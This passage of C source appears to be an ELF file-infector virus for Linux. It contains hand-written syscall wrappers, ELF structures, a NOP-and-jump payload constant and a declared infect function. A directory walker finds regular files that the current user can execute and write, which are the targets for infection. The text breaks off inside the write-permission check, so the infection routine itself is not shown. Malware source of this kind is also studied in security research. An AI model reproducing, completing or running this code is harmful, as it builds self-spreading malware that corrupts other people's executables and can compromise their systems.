#define _XOPEN_SOURCE 500

//#define ROOT_DIR   (".")
#define SPARE_FDS  (4)
#define MAX_FDS	(512)

#define RET_PATTERN 0xfffffffc

#define REQ_SIZE	0x9
#define PAY			("\x90\x90\x90\x90\xe9\xf7\xfc\xff\xff")

#define DEBUG 	1

// types.h

typedef unsigned int size_t;
typedef long		__kernel_off_t;
typedef __kernel_off_t		off_t;

typedef unsigned long int uintptr; /* size_t */
typedef long int intptr; /* ssize_t */

// end types.h

// elf.h

/* These constants are for the segment types stored in the image headers */
#define PT_NULL    0
#define PT_LOAD    1
#define PT_DYNAMIC 2
#define PT_INTERP  3
#define PT_NOTE    4
#define PT_SHLIB   5
#define PT_PHDR    6
#define PT_TLS     7               /* Thread local storage segment */
#define PT_LOOS    0x60000000      /* OS-specific */
#define PT_HIOS    0x6fffffff      /* OS-specific */
#define PT_LOPROC  0x70000000
#define PT_HIPROC  0x7fffffff
#define PT_GNU_EH_FRAME		0x6474e550

#define PT_GNU_STACK	(PT_LOOS + 0x474e551)


#define	EI_MAG0		0		/* e_ident[] indexes */
#define	EI_MAG1		1
#define	EI_MAG2		2
#define	EI_MAG3		3
#define	EI_CLASS	4
#define	EI_DATA		5
#define	EI_VERSION	6
#define	EI_OSABI	7
#define	EI_PAD		8

#define	ELFCLASSNONE	0		/* EI_CLASS */
#define	ELFCLASS32	1
#define	ELFCLASS64	2
#define	ELFCLASSNUM	3


/* sh_type */
#define SHT_NULL	0
#define SHT_PROGBITS	1
#define SHT_SYMTAB	2
#define SHT_STRTAB	3
#define SHT_RELA	4
#define SHT_HASH	5
#define SHT_DYNAMIC	6
#define SHT_NOTE	7
#define SHT_NOBITS	8
#define SHT_REL		9
#define SHT_SHLIB	10
#define SHT_DYNSYM	11
#define SHT_NUM		12
#define SHT_LOPROC	0x70000000
#define SHT_HIPROC	0x7fffffff
#define SHT_LOUSER	0x80000000
#define SHT_HIUSER	0xffffffff

/* sh_flags */
#define SHF_WRITE		0x1
#define SHF_ALLOC		0x2
#define SHF_EXECINSTR		0x4
#define SHF_RELA_LIVEPATCH	0x00100000
#define SHF_RO_AFTER_INIT	0x00200000
#define SHF_MASKPROC		0xf0000000

/* special section indexes */
#define SHN_UNDEF	0
#define SHN_LORESERVE	0xff00
#define SHN_LOPROC	0xff00
#define SHN_HIPROC	0xff1f
#define SHN_LIVEPATCH	0xff20
#define SHN_ABS		0xfff1
#define SHN_COMMON	0xfff2
#define SHN_HIRESERVE	0xffff

#define EI_NIDENT	16

/* 64-bit ELF base types. */
typedef unsigned long long	Elf64_Addr;
typedef unsigned short	Elf64_Half;
typedef signed short	Elf64_SHalf;
typedef unsigned long long	Elf64_Off;
typedef signed int	Elf64_Sword;
typedef unsigned int	Elf64_Word;
typedef unsigned long long	Elf64_Xword;
typedef signed long long	Elf64_Sxword;

typedef struct elf64_hdr {
  unsigned char	e_ident[EI_NIDENT];	/* ELF "magic number" */
  Elf64_Half e_type;
  Elf64_Half e_machine;
  Elf64_Word e_version;
  Elf64_Addr e_entry;		/* Entry point virtual address */
  Elf64_Off e_phoff;		/* Program header table file offset */
  Elf64_Off e_shoff;		/* Section header table file offset */
  Elf64_Word e_flags;
  Elf64_Half e_ehsize;
  Elf64_Half e_phentsize;
  Elf64_Half e_phnum;
  Elf64_Half e_shentsize;
  Elf64_Half e_shnum;
  Elf64_Half e_shstrndx;
} Elf64_Ehdr;

typedef struct elf64_shdr {
  Elf64_Word sh_name;		/* Section name, index in string tbl */
  Elf64_Word sh_type;		/* Type of section */
  Elf64_Xword sh_flags;		/* Miscellaneous section attributes */
  Elf64_Addr sh_addr;		/* Section virtual addr at execution */
  Elf64_Off sh_offset;		/* Section file offset */
  Elf64_Xword sh_size;		/* Size of section in bytes */
  Elf64_Word sh_link;		/* Index of another section */
  Elf64_Word sh_info;		/* Additional section information */
  Elf64_Xword sh_addralign;	/* Section alignment */
  Elf64_Xword sh_entsize;	/* Entry size if section holds table */
} Elf64_Shdr;

typedef struct elf64_phdr {
  Elf64_Word p_type;
  Elf64_Word p_flags;
  Elf64_Off p_offset;		/* Segment file offset */
  Elf64_Addr p_vaddr;		/* Segment virtual address */
  Elf64_Addr p_paddr;		/* Segment physical address */
  Elf64_Xword p_filesz;		/* Segment size in file */
  Elf64_Xword p_memsz;		/* Segment size in memory */
  Elf64_Xword p_align;		/* Segment alignment, file & memory */
} Elf64_Phdr;

#define	ELFMAG0		0x7f		// EI_MAG
#define	ELFMAG1		'E'
#define	ELFMAG2		'L'
#define	ELFMAG3		'F'
//#define	ELFMAG		"\177ELF"

#define PF_R		0x4
#define PF_W		0x2
#define PF_X		0x1

#define SHN_UNDEF	0
#define SHN_LORESERVE	0xff00
#define SHN_LOPROC	0xff00
#define SHN_HIPROC	0xff1f
#define SHN_ABS		0xfff1
#define SHN_COMMON	0xfff2
#define SHN_HIRESERVE	0xffff

// end elf.h


// resource.h

#define	RLIMIT_OFILE	8

struct rlimit {
	unsigned long	rlim_cur;		/* current (soft) limit */
	unsigned long	rlim_max;		/* maximum value for rlim_cur */
};

// end resource.h

// dirent.h

struct linux_dirent {
	unsigned long  d_ino;	 /* Inode number */
	unsigned long  d_off;	 /* Offset to next linux_dirent */
	unsigned short d_reclen;  /* Length of this linux_dirent */
	char		   d_name[];  /* Filename (null-terminated) */
						/* length is actually (d_reclen - 2 -
						   offsetof(struct linux_dirent, d_name) */
	/*
	char		   pad;	   // Zero padding byte
	char		   d_type;	// File type (only since Linux 2.6.4;
							  // offset is (d_reclen - 1))
	*/

};

// end dirent.h

// stat.h

// from my kernel's header

typedef long long __kernel_long_t;
typedef unsigned long long __kernel_ulong_t;

typedef __kernel_ulong_t	dev_t;
typedef __kernel_ulong_t	ino_t;
typedef __kernel_ulong_t	nlink_t;
typedef unsigned int 		uid_t;
typedef uid_t 				gid_t;
typedef unsigned int 		mode_t;

struct stat {
	__kernel_ulong_t	st_dev;
	__kernel_ulong_t	st_ino;
	__kernel_ulong_t	st_nlink;

	unsigned int		st_mode;
	unsigned int		st_uid;
	unsigned int		st_gid;
	unsigned int		__pad0;
	__kernel_ulong_t	st_rdev;
	__kernel_long_t		st_size;
	__kernel_long_t		st_blksize;
	__kernel_long_t		st_blocks;	// Number 512-byte blocks allocated.

	__kernel_ulong_t	st_atime;
	__kernel_ulong_t	st_atime_nsec;
	__kernel_ulong_t	st_mtime;
	__kernel_ulong_t	st_mtime_nsec;
	__kernel_ulong_t	st_ctime;
	__kernel_ulong_t	st_ctime_nsec;
	__kernel_long_t		__unused[3];
};

/*
// from my kernel's header

// ? maybe this can help?
// #if __BITS_PER_LONG == 64

# define timespec64 timespec

typedef signed long long time64_t;
struct timespec64 {
	time64_t	tv_sec;			// seconds
	long		tv_nsec;		// nanoseconds
};

// originally kstat
struct stat {
	u32		result_mask;	// What fields the user got
	umode_t		mode;
	unsigned int	nlink;
	uint32_t	blksize;	// Preferred I/O size
	u64		attributes;
	u64		attributes_mask;
//#define KSTAT_ATTR_FS_IOC_FLAGS				\
	(STATX_ATTR_COMPRESSED |			\
	 STATX_ATTR_IMMUTABLE |				\
	 STATX_ATTR_APPEND |				\
	 STATX_ATTR_NODUMP |				\
	 STATX_ATTR_ENCRYPTED				\
	 )// Attrs corresponding to FS_*_FL flags
	u64		ino;
	dev_t		dev;
	dev_t		rdev;
	kuid_t		uid;
	kgid_t		gid;
	loff_t		size;
	struct timespec	atime;
	struct timespec	mtime;
	struct timespec	ctime;
	struct timespec	btime;			// File creation time
	u64		blocks;
};*/

// from a weird reference
/*typedef unsigned long	dev_t;
typedef unsigned long	ino_t;

typedef	unsigned long	mode_t;			// (historical version)
typedef	unsigned long	nlink_t;		// (historical version)
typedef	long	pid_t;			// (historical version)
typedef	int	uid_t;

typedef	uid_t	gid_t;

typedef long long	off_t;

typedef	long	time_t;

struct stat
{
	dev_t	st_dev;			// inode's device
	ino_t	st_ino;			// inode's number
	mode_t	st_mode;		// inode protection mode
	nlink_t	st_nlink;		// number of hard links
	uid_t	st_uid;			// user ID of the file's owner
	gid_t	st_gid;			// group ID of the file's group
	dev_t	st_rdev;		// device type
	off_t	st_size;		// file size, in bytes
	time_t	st_atime;		// time of last access
	long	st_spare1;
	time_t	st_mtime;		// time of last data modification
	long	st_spare2;
	time_t	st_ctime;		// time of last file status change
	long	st_spare3;
	long	st_blksize;		// optimal blocksize for I/O
	long	st_blocks;		// blocks allocated for file
	unsigned long	st_flags;		// user defined flags for file
	unsigned long	st_gen;			// file generation number
};*/
/*
// from bootlin https://elixir.bootlin.com/linux/v3.1/source/include/asm-generic/stat.h#L23
struct stat {
	unsigned long	st_dev;		// Device.
	unsigned long	st_ino;		// File serial number.
	unsigned int	st_mode;	// File mode.
	unsigned int	st_nlink;	// Link count.
	unsigned int	st_uid;		// User ID of the file's owner.
	unsigned int	st_gid;		// Group ID of the file's group
	unsigned long	st_rdev;	// Device number, if device.
	unsigned long	__pad1;
	long		st_size;	// Size of file, in bytes.
	int		st_blksize;	// Optimal block size for I/O.
	int		__pad2;
	long		st_blocks;	// Number 512-byte blocks allocated.
	long		st_atime;	// Time of last access.
	unsigned long	st_atime_nsec;
	long		st_mtime;	// Time of last modification.
	unsigned long	st_mtime_nsec;
	long		st_ctime;	// Time of last status change.
	unsigned long	st_ctime_nsec;
	unsigned int	__unused4;
	unsigned int	__unused5;
};

// from linux 4.13.0 orig kernel source code

typedef unsigned int u32;
typedef signed int s32;
typedef unsigned short u16;
typedef signed short s16;
typedef unsigned long long u64;
typedef signed long long s64;

typedef u32		compat_size_t;
typedef s32		compat_ssize_t;
typedef s32		compat_time_t;
typedef s32		compat_clock_t;
typedef s32		compat_pid_t;
typedef u16		__compat_uid_t;
typedef u16		__compat_gid_t;
typedef u32		__compat_uid32_t;
typedef u32		__compat_gid32_t;
typedef u16		compat_mode_t;
typedef u32		compat_ino_t;
typedef u16		compat_dev_t;
typedef s32		compat_off_t;
typedef s64		compat_loff_t;
typedef u16		compat_nlink_t;

typedef compat_dev_t	dev_t;
typedef compat_ino_t	ino_t;
typedef compat_nlink_t	nlink_t;
typedef compat_mode_t	mode_t;

//struct compat_stat {
struct stat {
	compat_dev_t	st_dev;
	u16		__pad1;
	compat_ino_t	st_ino;
	compat_mode_t	st_mode;
	compat_nlink_t	st_nlink;
	__compat_uid_t	st_uid;
	__compat_gid_t	st_gid;
	compat_dev_t	st_rdev;
	u16		__pad2;
	u32		st_size;
	u32		st_blksize;
	u32		st_blocks;
	u32		st_atime;
	u32		st_atime_nsec;
	u32		st_mtime;
	u32		st_mtime_nsec;
	u32		st_ctime;
	u32		st_ctime_nsec;
	u32		__unused4;
	u32		__unused5;
};*/

#define S_IFMT  00170000
#define S_IFSOCK 0140000
#define S_IFLNK	 0120000
#define S_IFREG  0100000
#define S_IFBLK  0060000
#define S_IFDIR  0040000
#define S_IFCHR  0020000
#define S_IFIFO  0010000
#define S_ISUID  0004000
#define S_ISGID  0002000
#define S_ISVTX  0001000

#define S_ISLNK(m)	(((m) & S_IFMT) == S_IFLNK)
#define S_ISREG(m)	(((m) & S_IFMT) == S_IFREG)
#define S_ISDIR(m)	(((m) & S_IFMT) == S_IFDIR)
#define S_ISCHR(m)	(((m) & S_IFMT) == S_IFCHR)
#define S_ISBLK(m)	(((m) & S_IFMT) == S_IFBLK)
#define S_ISFIFO(m)	(((m) & S_IFMT) == S_IFIFO)
#define S_ISSOCK(m)	(((m) & S_IFMT) == S_IFSOCK)

//#define	S_ISUID	0004000			/* set user id on execution */
//#define	S_ISGID	0002000			/* set group id on execution */
#define	S_ISTXT	0001000			/* sticky bit */

#define	S_IRWXU	00700			/* RWX mask for owner */
#define	S_IRUSR	00400			/* R for owner */
#define	S_IWUSR	00200			/* W for owner */
#define	S_IXUSR	00100			/* X for owner */\

#define	S_IRWXG	0000070			/* RWX mask for group */
#define	S_IRGRP	0000040			/* R for group */
#define	S_IWGRP	0000020			/* W for group */
#define	S_IXGRP	0000010			/* X for group */

#define	S_IRWXO	0000007			/* RWX mask for other */
#define	S_IROTH	0000004			/* R for other */
#define	S_IWOTH	0000002			/* W for other */
#define	S_IXOTH	0000001			/* X for other */

// end stat.h

// syscall.h
#define SYS_READ	0
#define SYS_WRITE   1
#define SYS_OPEN	2
#define SYS_CLOSE   3
#define SYS_STAT	4
#define SYS_FSTAT   5
#define SYS_LSEEK   8
#define SYS_MMAP	9
#define SYS_MPROTECT	10
#define SYS_MUNMAP	11
#define SYS_GETPID  39
#define SYS_GETDENTS	78
#define SYS_GETCWD  79
#define SYS_CHMOD	90
#define SYS_FCHMOD	91
#define SYS_GETRLIMIT   97
#define SYS_PTRACE  101
#define SYS_GETUID  102
#define SYS_GETGID  104
#define SYS_GETEUID 107
#define SYS_GETEGID 108
#define SYS_GETPPID 110
#define SYS_GETPGRP 111
#define SYS_GETDENTS64  217

intptr read(int fd, char *buf, uintptr nbytes);
intptr write(int fd, void const* data, uintptr nbytes);
intptr open3(const char *filename, intptr flags, intptr mode);
intptr open(const char *filename, intptr flags);
intptr close(int fd);
intptr getuid();
intptr getrlimit(unsigned int resource, struct rlimit *rlim);
intptr getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
intptr getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
intptr getcwd(char *buf, unsigned long size);
intptr stat(const char *filename, struct stat *statbuf);
intptr fstat(unsigned int fd, struct stat *statbuf);
intptr chmod(const char *filename, mode_t mode);
intptr fchmod(unsigned int fd, mode_t mode);
intptr mmap(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long off);
intptr munmap(unsigned long addr, size_t len);
intptr mprotect(unsigned long start, size_t len, unsigned long prot);
intptr lseek(unsigned int fd, off_t offset, unsigned int origin);

void* syscall6(
	void* number,
	void* arg1,
	void* arg2,
	void* arg3,
	void* arg4,
	void* arg5,
	void* arg6
);

void* syscall5(
	void* number,
	void* arg1,
	void* arg2,
	void* arg3,
	void* arg4,
	void* arg5
);

void* syscall4(
	void* number,
	void* arg1,
	void* arg2,
	void* arg3,
	void* arg4
);

void* syscall3(
	void* number,
	void* arg1,
	void* arg2,
	void* arg3
);

void* syscall2(
	void* number,
	void* arg1,
	void* arg2
);

void* syscall1(
	void* number,
	void* arg1
);

void* syscall(
	void* number
);

// end syscall.h

// stdio.h

#define NULL	0
int my_memcmp(const unsigned char *str1, const unsigned char *str2, size_t count);

// end stdio.h

// fcntl.h

#define	O_RDONLY	0x0000		/* open for reading only */
#define	O_WRONLY	0x0001		/* open for writing only */
#define	O_RDWR		0x0002		/* open for reading and writing */
#define	O_ACCMODE	0x0003		/* mask for above modes */

#define O_CREAT		00000100	/* not fcntl */
#define O_EXCL		00000200	/* not fcntl */
#define O_NOCTTY	00000400	/* not fcntl */
#define O_TRUNC		00001000	/* not fcntl */
#define O_APPEND	00002000
#define O_NONBLOCK	00004000
#define O_DSYNC		00010000	/* used to be O_SYNC, see below */
#define FASYNC		00020000	/* fcntl, for BSD compatibility */
#define O_DIRECT	00040000	/* direct disk access hint */
#define O_LARGEFILE	00100000
#define O_DIRECTORY	00200000	/* must be a directory */
#define O_NOFOLLOW	00400000	/* don't follow links */
#define O_NOATIME	01000000
#define O_CLOEXEC	02000000	/* set close_on_exec */

// end fcntl.h

// ftw.h

/*
 * Valid flags for the 3rd argument to the function that is passed as the
 * second argument to ftw(3) and nftw(3).  Say it three times fast!
 */
#define	FTW_F		0	/* File.  */
#define	FTW_D		1	/* Directory.  */
#define	FTW_DNR		2	/* Directory without read permission.  */
#define	FTW_DP		3	/* Directory with subdirectories visited.  */
#define	FTW_NS		4	/* Unknown type; stat() failed.  */
#define	FTW_SL		5	/* Symbolic link.  */
#define	FTW_SLN		6	/* Sym link that names a nonexistent file.  */

/*
 * Flags for use as the 4th argument to nftw(3).  These may be ORed together.
 */
#define	FTW_PHYS	0x01	/* Physical walk, don't follow sym links.  */
#define	FTW_MOUNT	0x02	/* The walk does not cross a mount point.  */
#define	FTW_DEPTH	0x04	/* Subdirs visited before the dir itself. */
#define	FTW_CHDIR	0x08	/* Change to a directory before reading it. */

struct FTW {
	int base;
	int level;
};

// end ftw.h

// fts.h

typedef struct _fts {
	struct _ftsent *fts_cur;	/* current node */
	struct _ftsent *fts_child;	/* linked list of children */
	struct _ftsent **fts_array;	/* sort array */
	dev_t fts_dev;			/* starting device # */
	char *fts_path;			/* path for this descent */
	int fts_rfd;			/* fd for root */
	int fts_pathlen;		/* sizeof(path) */
	int fts_nitems;			/* elements in the sort array */
	int (*fts_compar)();		/* compare function */

#define	FTS_COMFOLLOW	0x001		/* follow command line symlinks */
#define	FTS_LOGICAL	0x002		/* logical walk */
#define	FTS_NOCHDIR	0x004		/* don't change directories */
#define	FTS_NOSTAT	0x008		/* don't get stat info */
#define	FTS_PHYSICAL	0x010		/* physical walk */
#define	FTS_SEEDOT	0x020		/* return dot and dot-dot */
#define	FTS_XDEV	0x040		/* don't cross devices */
#define	FTS_WHITEOUT	0x080		/* return whiteout information */
#define	FTS_OPTIONMASK	0x0ff		/* valid user option mask */

#define	FTS_NAMEONLY	0x100		/* (private) child names only */
#define	FTS_STOP	0x200		/* (private) unrecoverable error */
	int fts_options;		/* fts_open options, global flags */
} FTS;

typedef struct _ftsent {
	struct _ftsent *fts_cycle;	/* cycle node */
	struct _ftsent *fts_parent;	/* parent directory */
	struct _ftsent *fts_link;	/* next file in directory */
	long fts_number;			/* local numeric value */
	void *fts_pointer;			/* local address value */
	char *fts_accpath;		/* access path */
	char *fts_path;			/* root path */
	int fts_errno;			/* errno for this node */
	int fts_symfd;			/* fd for symlink */
	unsigned short fts_pathlen;		/* strlen(fts_path) */
	unsigned short fts_namelen;		/* strlen(fts_name) */

	ino_t fts_ino;			/* inode */
	dev_t fts_dev;			/* device */
	nlink_t fts_nlink;		/* link count */

#define	FTS_ROOTPARENTLEVEL	-1
#define	FTS_ROOTLEVEL		 0
	short fts_level;		/* depth (-1 to N) */

#define	FTS_D		 1		/* preorder directory */
#define	FTS_DC		 2		/* directory that causes cycles */
#define	FTS_DEFAULT	 3		/* none of the above */
#define	FTS_DNR		 4		/* unreadable directory */
#define	FTS_DOT		 5		/* dot or dot-dot */
#define	FTS_DP		 6		/* postorder directory */
#define	FTS_ERR		 7		/* error; errno is set */
#define	FTS_F		 8		/* regular file */
#define	FTS_INIT	 9		/* initialized only */
#define	FTS_NS		10		/* stat(2) failed */
#define	FTS_NSOK	11		/* no stat(2) requested */
#define	FTS_SL		12		/* symbolic link */
#define	FTS_SLNONE	13		/* symbolic link without target */
#define	FTS_W		14		/* whiteout object */
	unsigned short fts_info;		/* user flags for FTSENT structure */

#define	FTS_DONTCHDIR	 0x01		/* don't chdir .. to the parent */
#define	FTS_SYMFOLLOW	 0x02		/* followed a symlink to get here */
#define	FTS_ISW		 0x04		/* this is a whiteout object */
	unsigned short fts_flags;		/* private flags for FTSENT structure */

#define	FTS_AGAIN	 1		/* read node again */
#define	FTS_FOLLOW	 2		/* follow symbolic link */
#define	FTS_NOINSTR	 3		/* no instructions */
#define	FTS_SKIP	 4		/* discard node */
	unsigned short fts_instr;		/* fts_set() instructions */

	struct stat *fts_statp;		/* stat(2) information */
	char fts_name[1];		/* file name */
} FTSENT;

// end fts.h

// limits.h

#define	_POSIX_OPEN_MAX		20
#define OPEN_MAX			_POSIX_OPEN_MAX

// end limits.h

// fs.h

#define DT_UNKNOWN	0
#define DT_FIFO		1
#define DT_CHR		2
#define DT_DIR		4
#define DT_BLK		6
#define DT_REG		8
#define DT_LNK		10
#define DT_SOCK		12
#define DT_WHT		14

// end fs.h

// mman-common.h

#define PROT_READ	0x1		/* page can be read */
#define PROT_WRITE	0x2		/* page can be written */
#define PROT_EXEC	0x4		/* page can be executed */

#define MAP_SHARED	0x01		/* Share changes */

// end mman-common.h

uintptr my_strlen(char const* str);
char* my_strncat(char *dest, const char *src, size_t n);
char* my_strncpy(char *dest, const char *src, size_t n);
void reverse(char str[], int length);
char* itoa(int num, char* str, int base);
void* my_memset(void *b, int c, int len);
void * my_memmove(void *dst, const void *src, size_t len);
int infect(const char* fpath);

// syscall.c

intptr read(int fd, char *buf, uintptr nbytes)
{
	return (intptr)
		syscall3(
			(void*)SYS_READ,
			(void*)(intptr)fd,
			(void*)buf,
			(void*)nbytes
		);
}

intptr write(int fd, void const* data, uintptr nbytes)
{
	return (intptr)
		syscall3(
			(void*)SYS_WRITE,
			(void*)(intptr)fd,
			(void*)data,
			(void*)nbytes
		);
}

intptr open3(const char *filename, intptr flags, intptr mode)
{
	return (intptr)
		syscall3(
			(void*)SYS_OPEN,
			(void*)filename,
			(void*)flags,
			(void*)mode
		);
}

intptr open(const char *filename, intptr flags)
{
	return (intptr)
		syscall2(
			(void*)SYS_OPEN,
			(void*)filename,
			(void*)flags
		);
}

intptr close(int fd)
{
	return (intptr)
		syscall1(
			(void*)SYS_CLOSE,
			(void*)(intptr)fd
		);
}

intptr getuid()
{
	return (intptr)
		syscall(
			(void*)SYS_GETUID
		);
}

intptr getrlimit(unsigned int resource, struct rlimit *rlim)
{
	return (intptr)
		syscall2(
			(void*)SYS_GETRLIMIT,
			(void*)(unsigned long)resource,
			(void*)rlim
		);
}

intptr getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	return (intptr)
		syscall3(
			(void*)SYS_GETDENTS,
			(void*)(unsigned long)fd,
			(void*)dirp,
			(void*)(unsigned long)count
		);
}

intptr getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	return (intptr)
		syscall3(
			(void*)SYS_GETDENTS64,
			(void*)(unsigned long)fd,
			(void*)dirp,
			(void*)(unsigned long)count
		);
}

intptr getcwd(char *buf, unsigned long size)
{
	return (intptr)
		syscall2(
			(void*)SYS_GETCWD,
			(void*)buf,
			(void*)size
		);
}

intptr stat(const char *filename, struct stat *statbuf) {
	return (intptr)
		syscall2(
			(void*)SYS_STAT,
			(void*)filename,
			(void*)statbuf
		);
}

intptr fstat(unsigned int fd, struct stat *statbuf) {
	return (intptr)
		syscall2(
			(void*)SYS_FSTAT,
			(void*)(unsigned long)fd,
			(void*)statbuf
		);
}

intptr chmod(const char *filename, mode_t mode) {
	return (intptr)
		syscall2(
			(void*)SYS_CHMOD,
			(void*)filename,
			(void*)(unsigned long)mode
		);
}

intptr fchmod(unsigned int fd, mode_t mode) {
	return (intptr)
		syscall2(
			(void*)SYS_FCHMOD,
			(void*)(unsigned long)fd,
			(void*)(unsigned long)mode
		);
}

intptr mmap(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long off) {
	return (intptr)
		syscall6(
			(void*)SYS_MMAP,
			(void*)addr,
			(void*)len,
			(void*)prot,
			(void*)flags,
			(void*)fd,
			(void*)off
		);
}

intptr munmap(unsigned long addr, size_t len) {
	return (intptr)
		syscall2(
			(void*)SYS_MUNMAP,
			(void*)addr,
			(void*)(unsigned long)len
		);
}

intptr mprotect(unsigned long start, size_t len, unsigned long prot) {
	return (intptr)
		syscall3(
			(void*)SYS_MPROTECT,
			(void*)start,
			(void*)(unsigned long)len,
			(void*)prot
		);
}

intptr lseek(unsigned int fd, off_t offset, unsigned int origin) {
	return (intptr)
		syscall3(
			(void*)SYS_LSEEK,
			(void*)(unsigned long)fd,
			(void*)offset,
			(void*)(unsigned long)origin
		);
}

// end syscall.c

// stdio.c

int my_memcmp(const unsigned char *str1, const unsigned char *str2, size_t count)
{
  register const unsigned char *s1 = (const unsigned char*)str1;
  register const unsigned char *s2 = (const unsigned char*)str2;

  while (count-- > 0)
	{
	  if (*s1++ != *s2++)
	  return s1[-1] < s2[-1] ? -1 : 1;
	}
  return 0;
}

// end stdio.c

// resource.c

int getdtablesize()
{
	struct rlimit r;
	if (getrlimit(RLIMIT_OFILE, &r) < 0) {
		return -1;
	}
	return r.rlim_cur;
}

// end resource.c

// nftw.c

int nftw(const char *path, int (*fn)(const char *, const struct stat *), int nfds)
{
	//char * const paths[2] = { (char *)path, NULL };
	int fd;
	int nread;
	char buf[32768];
	char cwd_buf[4096];
	struct linux_dirent *d;
	int bpos;
	char d_type;
	unsigned int path_len, file_len;

	if((fd = open(path, O_RDONLY | O_DIRECTORY)) < 0) {
		return -1;
	}
	
	for ( ; ; ) {
		nread = getdents(fd, (struct linux_dirent*)buf, 32768);
		if (nread == -1) {
			return -1;
		}

		if (nread == 0) {
			break;
		}
		getcwd(cwd_buf,4096);
		path_len = my_strlen(cwd_buf);
		//write(1,cwd_buf,my_strlen(cwd_buf));
		//write(1, "\n", 1);
		//write(1, "--------------- dirent -----------\n",my_strlen("--------------- dirent -----------\n"));
		//write(1, "file type   d_name\n", my_strlen("file type   d_name\n"));
		for (bpos = 0; bpos < nread;) {
			d = (struct linux_dirent *) (buf + bpos);
			//write(1, "%8ld  ", d->d_ino);
			if((d_type = *(buf + bpos + d->d_reclen - 1)) == DT_REG ) {
				// if(DEBUG) {
				// 	write(1, "[DEBUG] found reg file : ", my_strlen("[DEBUG] found reg file : "));
				// 	write(1, d->d_name, my_strlen(d->d_name));
				// 	write(1, "\n", 1);
				// }
				file_len = my_strlen(d->d_name);
				char abs_path[path_len + file_len + 1 + 1];
				my_memset(abs_path, '\0', path_len + file_len + 1 + 1);
				my_strncpy(abs_path, cwd_buf, path_len);
				char slash = '/';
				my_strncat(abs_path,&slash, 1);
				my_strncat(abs_path, d->d_name, file_len);
				struct stat statbuf;
				stat(abs_path, &statbuf);
				fn(abs_path, &statbuf);
			}

			/*if(d_type == DT_REG) {
				write(1, "regular", my_strlen("regular"));
			} else if(d_type == DT_DIR) {
				write(1, "directory", my_strlen("directory"));
			} else if(d_type == DT_FIFO) {
				write(1, "FIFO", my_strlen("FIFO"));
			} else if(d_type == DT_SOCK) {
				write(1, "socket", my_strlen("socket"));
			} else if(d_type == DT_LNK) {
				write(1, "symlink", my_strlen("symlink"));
			} else if(d_type == DT_BLK) {
				write(1, "block dev", my_strlen("block dev"));
			} else if(d_type == DT_CHR) {
				write(1, "char dev", my_strlen("char dev"));
			} else if(d_type == DT_UNKNOWN) {
				write(1, "unknown", my_strlen("unknown"));
			} else {
				write(1, "???", my_strlen("???"));
			}
			//printf("%4d %10lld  %s\n", d->d_reclen,(long long) d->d_off, d->d_name);
			write(1, "\t", 1);
			write(1, d->d_name, my_strlen(d->d_name));
			write(1, "\n", 1);*/
			bpos += d->d_reclen;
		}
	}

	return 0;
}

// end nftw.c

// maybe no global varible is good
//const unsigned char magic[] = {ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3};

int can_execute(const struct stat *sb, const char* fpath)
{
	//if(DEBUG) {
		// write(1, "[DEBUG] file : ", my_strlen("[DEBUG] file : "));
		// write(1, fpath, my_strlen(fpath));
		// if((sb->st_uid == getuid() && sb->st_mode & S_IXUSR)
		// 	|| (sb->st_mode & S_IXOTH)) {
		// 	write(1, " executable", my_strlen(" executable"));
		// } else {
		// 	write(1, " non-executable", my_strlen(" non-executable"));
		// }
		// write(1, "\n", 1);
	//}
	return (sb->st_uid == getuid() && sb->st_mode & S_IXUSR)
		|| (sb->st_mode & S_IXOTH);
}

int can_write(const struct stat *sb, const char* fpath)
{
	//if(DEBUG) {
		// write(1, "[DEBUG] file : ", my_strlen("[DEBUG] file : "));
		// write(1, fpath, my_strlen(fpath));
		// if((sb->st_uid == getuid() && sb->st_mode & S_IWUSR)
		// 	|| (sb->st_mode & S_IWOTH)) {
		// 	write(1, " writable", my_strlen(" writable"));
		// 	char tmp_stino[128];
		// 	itoa(sb->st_ino, tmp_stino, 10);
		// 	write(1, " st_ino(", my_strlen(" st_ino("));
		// 	write(1, tmp_stino, my_strlen(tmp_stino));
		// 	write(1, ")", 1);
		// 	char tmp_stmode[128];
		// 	itoa(sb->st_mode, tmp_stmode, 10);
		// 	write(1, " st_mode(", my_strlen(" st_mode("));
		// 	write(1, tmp_stmode, my_strlen(tmp_stmode));
		// 	write(1, ")", 1);
		// 	char tmp_stnlink[128];
		// 	itoa(sb->st_nlink, tmp_stnlink, 10);
		// 	write(1, " st_nlink(", my_strlen(" st_nlink("));
		// 	write(1, tmp_stnlink, my_strlen(tmp_stnlink));
		// 	write(1, ")", 1);
		// 	char tmp_stuid[128];
		// 	itoa(sb->st_uid, tmp_stuid, 10);
		// 	write(1, " st_uid(", my_strlen(" st_uid("));
		// 	write(1, tmp_stuid, my_strlen(tmp_stuid));
		// 	write(1, ")", 1);
		// 	char tmp_stgid[128];
		// 	itoa(sb->st_gid, tmp_stgid, 10);
		// 	write(1, " st_gid(", my_strlen(" st_gid("));
		// 	write(1, tmp_stgid, my_strlen(tmp_stgid));
		// 	write(1, ")", 1);
		// 	char tmp_stblksize[128];
		// 	itoa(sb->st_blksize, tmp_stblksize, 10);
		// 	write(1, " st_blksize(", my_strlen(" st_blksize("));
		// 	write(1, tmp_stblksize, my_strlen(tmp_stblksize));
		// 	write(1, ")", 1);
		// 	char tmp_stblocks[128];
		// 	itoa(sb->st_blocks, tmp_stblocks, 10);
		// 	write(1, " st_blocks(", my_strlen(" st_blocks("));
		// 	write(1, tmp_stblocks, my_strlen(tmp_stblocks));
		// 	write(1, ")", 1);
		// 	char tmp_stsize[128];
		// 	itoa(sb->st_size, tmp_stsize, 10);
		// 	write(1, " st_size(", my_strlen(" st_size("));
		// 	write(1, tmp_stsize, my_strlen(tmp_stsize));
		// 	write(1, ")", 1);
		// } else {
		// 	write(1, " non-writable", my_strlen(" non-writable"));
		// 	if(sb->st_uid != getuid() && (sb->st_mode & S_IWOTH)) {
		// 		write(1, " as no W others", my_strlen(" as no W others"));
		// 	} else if(sb->st_uid == getuid() && (sb->st_mode & S_IWUSR) == 0) {
